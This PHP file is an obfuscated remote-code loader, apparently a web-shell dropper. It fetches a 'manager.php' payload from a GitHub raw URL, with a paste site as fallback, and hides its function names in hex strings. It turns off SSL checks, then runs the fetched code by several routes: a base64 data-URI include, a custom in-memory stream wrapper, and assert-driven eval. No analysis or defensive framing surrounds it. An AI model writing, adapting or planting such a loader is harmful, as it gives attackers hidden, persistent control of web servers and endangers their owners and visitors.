<?php

error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('memory_limit', '512M');
@set_time_limit(180);

$u = 'https://raw.githubusercontent.com/kontolwkwkpecah/xnxx.videla.net/refs/heads/main/manager.php';
$uFb = 'https://paste.myconan.net/679563.txt';

function _fx($hex)
{
    return pack('H*', $hex);
}

function _gk_ok($body)
{
    if (!is_string($body) || $body === '') {
        return false;
    }
    return strpos($body, '<?') !== false;
}

function _gk_fetch($url, $fx, $httpCtx)
{
    $o = false;
    $fe = $fx['fe'];
    $fg = $fx['fg'];

    if (@$fe($fx['fo'])) {
        $fo = $fx['fo'];
        $sg = $fx['sg'];
        $fc = $fx['fc'];
        $fh = @$fo($url, 'rb', false, $httpCtx);
        if ($fh) {
            $o = @$sg($fh);
            @$fc($fh);
        }
    }

    $ig = $fx['ig'];
    if (($o === false || $o === '') && @$ig($fx['auf'])) {
        $o = @$fg($url, false, $httpCtx);
    }

    if (($o === false || $o === '') && @$fe($fx['ci'])) {
        $ci = $fx['ci'];
        $co = $fx['co'];
        $ce = $fx['ce'];
        $cl = $fx['cl'];
        $cn = $fx['cn'];
        $ch = @$ci($url);
        if ($ch) {
            @$co($ch, @$cn('CURLOPT_RETURNTRANSFER'), true);
            @$co($ch, @$cn('CURLOPT_FOLLOWLOCATION'), true);
            @$co($ch, @$cn('CURLOPT_TIMEOUT'), 30);
            @$co($ch, @$cn('CURLOPT_USERAGENT'), 'Mozilla/5.0');
            @$co($ch, @$cn('CURLOPT_SSL_VERIFYPEER'), false);
            @$co($ch, @$cn('CURLOPT_SSL_VERIFYHOST'), false);
            $o = @$ce($ch);
            @$cl($ch);
        }
    }

    return $o;
}

$fx = array(
    'fg' => _fx('66696c655f6765745f636f6e74656e7473'),
    'fe' => _fx('66756e6374696f6e5f657869737473'),
    'ig' => _fx('696e695f676574'),
    'fo' => _fx('666f70656e'),
    'sg' => _fx('73747265616d5f6765745f636f6e74656e7473'),
    'fc' => _fx('66636c6f7365'),
    'ci' => _fx('6375726c5f696e6974'),
    'co' => _fx('6375726c5f7365746f7074'),
    'ce' => _fx('6375726c5f65786563'),
    'cl' => _fx('6375726c5f636c6f7365'),
    'cn' => _fx('636f6e7374616e74'),
    'b64' => _fx('6261736536345f656e636f6465'),
    'swr' => _fx('73747265616d5f777261707065725f7265676973746572'),
    'auf' => _fx('616c6c6f775f75726c5f666f70656e'),
);

$fe = $fx['fe'];

$httpCtx = stream_context_create(array(
    'http' => array(
        'timeout' => 30,
        'follow_location' => 1,
        'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'header' => "Accept: */*\r\n",
    ),
    'ssl' => array(
        'verify_peer' => false,
        'verify_peer_name' => false,
        'allow_self_signed' => true,
    ),
));

$o = _gk_fetch($u, $fx, $httpCtx);
if (!_gk_ok($o)) {
    $o = _gk_fetch($uFb, $fx, $httpCtx);
}

if (!_gk_ok($o)) {
    header('Content-Type: text/html; charset=UTF-8');
    echo '<center><h1>Failed to load.</h1></center>';
    exit;
}

$src = $o;
if (strncmp($src, "\xEF\xBB\xBF", 3) === 0) {
    $src = substr($src, 3);
}

$b64 = $fx['b64'];
$dataUri = _fx('646174613a746578742f706c61696e3b6261736536342c') . @$b64($src);
ob_start();
$incOk = @include $dataUri;
if ($incOk !== false) {
    ob_end_flush();
    exit;
}
ob_end_clean();

if (!class_exists('GkMemStream', false)) {
    class GkMemStream
    {
        public $context;
        private $data;
        private $pos = 0;

        public function stream_open($path, $mode, $options, &$opened_path)
        {
            $this->data = isset($GLOBALS['__gk_src']) ? (string)$GLOBALS['__gk_src'] : '';
            $this->pos = 0;
            return $this->data !== '';
        }

        public function stream_read($count)
        {
            $chunk = substr($this->data, $this->pos, $count);
            $this->pos += strlen($chunk);
            return $chunk;
        }

        public function stream_eof()
        {
            return $this->pos >= strlen($this->data);
        }

        public function stream_stat()
        {
            $len = strlen($this->data);
            return array(
                'size' => $len,
                7 => $len,
            );
        }

        public function url_stat($path, $flags)
        {
            return array('size' => isset($GLOBALS['__gk_src']) ? strlen((string)$GLOBALS['__gk_src']) : 0);
        }

        public function stream_set_option($option, $arg1, $arg2)
        {
            return false;
        }
    }
}

$swr = $fx['swr'];
$scheme = _fx('676b6d656d');
$GLOBALS['__gk_src'] = $src;
if (@$fe($swr)) {
    @stream_wrapper_unregister($scheme);
    if (@$swr($scheme, 'GkMemStream')) {
        ob_start();
        $memOk = @include($scheme . '://payload');
        if ($memOk !== false) {
            ob_end_flush();
            exit;
        }
        ob_end_clean();
    }
}

$ax = _fx('617373657274');
$ex = _fx('6576616c2824474c4f42414c535b275f5f676b5f63275d29207c7c2031');
$codeBody = $src;
if (preg_match('/^\s*<\?(?:php)?/i', $codeBody)) {
    $codeBody = preg_replace('/^\s*<\?(?:php)?\s*/i', '', $codeBody, 1);
}
$GLOBALS['__gk_c'] = $codeBody;
if (@$fe($ax)) {
    @assert_options(1, 1);
    @assert_options(4, 0);
    @assert_options(5, 0);
    ob_start();
    $ar = @$ax($ex);
    if ($ar !== false) {
        ob_end_flush();
        exit;
    }
    ob_end_clean();
}

header('Content-Type: text/html; charset=UTF-8');
echo '<center><h1>Failed to execute.</h1></center>';